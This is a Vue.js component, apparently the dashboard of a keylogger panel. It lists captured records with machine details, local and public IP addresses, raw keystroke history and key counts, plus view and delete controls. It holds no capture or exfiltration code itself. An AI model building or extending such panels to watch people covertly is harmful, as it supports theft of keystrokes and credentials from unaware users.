<template>
  <div>
    <b-table
      id="keylog-table"
      responsive
      bordered
      :filter="query"
      show-empty
      hover
      :per-page="limit"
      :items="items"
      :fields="fields"
      :current-page="currentPage"
    >
      <template #cell(Actions)="data">
        <div>
          <fa
            :icon="['fas', 'eye']"
            class="text-success"
            style="cursor: pointer;"
            @click="$bvModal.show(`detail-modal-${data.item.id}`)"
          />
          <fa
            :icon="['fas', 'trash']"
            class="text-danger"
            style="cursor: pointer;"
            @click="$emit('keylog-table-delete-', data.item.id)"
          />
          <b-modal
            :id="`detail-modal-${data.item.id}`"
            :title="`Showing detail history of user with id ${data.item.id}`"
            size="xl"
          >
            <b-container fluid>
              <b-row>
                <b-col cols="6">
                  <p>User information</p>
                  <b-input-group prepend="UserID" class="mt-3">
                    <b-form-input disabled :value="data.item.id"></b-form-input>
                  </b-input-group>
                  <b-input-group prepend="Local IP" class="mt-3">
                    <b-form-input
                      disabled
                      :value="data.item.local_ip_address"
                    ></b-form-input>
                  </b-input-group>
                  <b-input-group prepend="Public IP" class="mt-3">
                    <b-form-input
                      disabled
                      :value="data.item.public_ip_address"
                    ></b-form-input>
                  </b-input-group>
                  <p>User machine information</p>
                  <b-input-group prepend="CPU Info" class="mt-3">
                    <b-form-input
                      disabled
                      :value="data.item.cpu_info"
                    ></b-form-input>
                  </b-input-group>
                  <b-input-group prepend="Machine type" class="mt-3">
                    <b-form-input
                      disabled
                      :value="data.item.machine_type"
                    ></b-form-input>
                  </b-input-group>
                  <b-input-group prepend="System" class="mt-3">
                    <b-form-input
                      disabled
                      :value="data.item.system"
                    ></b-form-input>
                  </b-input-group>
                  <b-input-group prepend="System version" class="mt-3">
                    <b-form-input
                      disabled
                      :value="data.item.system_version"
                    ></b-form-input>
                  </b-input-group>
                  <b-input-group prepend="Time recorded" class="mt-3">
                    <b-form-input
                      disabled
                      :value="data.item.time_recorded"
                    ></b-form-input>
                  </b-input-group>
                </b-col>
                <b-col cols="6">
                  <p>User Raw input</p>
                </b-col>
              </b-row>
            </b-container>
          </b-modal>
        </div>
      </template>
    </b-table>
    <b-pagination
      v-model="currentPage"
      :total-rows="items.length"
      :per-page="limit"
      aria-controls="keylog-table"
    ></b-pagination>
  </div>
</template>
<script>
export default {
  name: 'KeylogTable',
  props: {
    items: {
      type: Array,
      default: () => {
        return []
      }
    },
    limit: {
      type: Number,
      default: 10
    }
  },
  data() {
    return {
      query: '',
      fields: [
        { key: 'id', sortable: true },
        { key: 'local_ip_address', sortable: true },
        { key: 'cpu_info', sortable: true },
        { key: 'history', sortable: true },
        { key: 'history_raw', sortable: true },
        { key: 'key_count', sortable: true },
        { key: 'machine_type', sortable: true },
        { key: 'system', sortable: true },
        { key: 'system_version', sortable: true },
        { key: 'time_recorded', sortable: true },
        { key: 'Actions' }
      ],
      currentPage: 1
    }
  }
}
</script>
